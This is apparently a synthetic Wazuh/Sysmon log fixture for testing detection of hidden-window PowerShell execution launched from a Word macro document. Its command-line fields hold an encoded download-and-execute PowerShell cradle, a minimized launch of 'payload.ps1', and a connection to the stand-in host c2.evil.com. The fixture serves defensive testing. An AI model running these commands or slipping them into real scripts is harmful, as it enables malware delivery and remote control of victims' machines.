{
  "_metadata": {
    "attack_id": "T1564.003",
    "variation": "001",
    "name": "Hidden PowerShell Window Execution",
    "description": "Adversary executes PowerShell with hidden window to evade user detection",
    "expected_detection": "HIGH",
    "kill_chain_phase": "defense-evasion",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 1 - PowerShell with -WindowStyle Hidden",
      "sequence": 1,
      "timestamp": "2026-01-30T10:00:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: PowerShell Hidden Window Execution",
          "id": "100801",
          "mitre": {
            "id": [
              "T1564.003",
              "T1059.001"
            ],
            "tactic": [
              "Defense Evasion",
              "Execution"
            ],
            "technique": [
              "Hidden Window",
              "PowerShell"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000800.000001",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local"
            },
            "eventdata": {
              "utcTime": "2026-01-30 10:00:00.000",
              "processGuid": "{A1B2C3D4-1564-0003-0001-000000000001}",
              "processId": "6234",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAMADlADEAMAAwAC8AcwB0AGEAZwBlAHIAJwApAA==",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "hashes": "SHA256=6C5E2D4F3B2A1C0D9E8F7A6B5C4D3E2F1A0B9C8D7E6F5A4B3C2D1E0F9A8B7C6D",
              "parentProcessGuid": "{A1B2C3D4-1564-0003-0000-000000000001}",
              "parentProcessId": "5100",
              "parentImage": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
              "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\Invoice.docm\""
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 1 - cmd.exe with /c start /min",
      "sequence": 2,
      "timestamp": "2026-01-30T10:00:05.000Z",
      "log": {
        "rule": {
          "level": 10,
          "description": "Sysmon - Event 1: Minimized CMD Execution",
          "id": "100802",
          "mitre": {
            "id": [
              "T1564.003"
            ],
            "tactic": [
              "Defense Evasion"
            ],
            "technique": [
              "Hidden Window"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000800.000002",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local"
            },
            "eventdata": {
              "utcTime": "2026-01-30 10:00:05.000",
              "processGuid": "{A1B2C3D4-1564-0003-0002-000000000001}",
              "processId": "6250",
              "image": "C:\\Windows\\System32\\cmd.exe",
              "commandLine": "cmd.exe /c start /min powershell.exe -ep bypass -f C:\\Users\\Public\\payload.ps1",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{A1B2C3D4-1564-0003-0001-000000000001}",
              "parentProcessId": "6234",
              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "parentCommandLine": "powershell.exe -WindowStyle Hidden"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 3 - Hidden PowerShell making network connection",
      "sequence": 3,
      "timestamp": "2026-01-30T10:00:10.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: Hidden PowerShell Network Connection",
          "id": "100803",
          "mitre": {
            "id": [
              "T1564.003",
              "T1071.001"
            ],
            "tactic": [
              "Defense Evasion",
              "Command and Control"
            ],
            "technique": [
              "Hidden Window",
              "Web Protocols"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000800.000003",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local"
            },
            "eventdata": {
              "utcTime": "2026-01-30 10:00:10.000",
              "processGuid": "{A1B2C3D4-1564-0003-0001-000000000001}",
              "processId": "6234",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "198.51.100.20",
              "sourcePort": "54321",
              "destinationIp": "198.51.100.100",
              "destinationPort": "443",
              "destinationHostname": "c2.evil.com"
            }
          }
        }
      }
    }
  ]
}
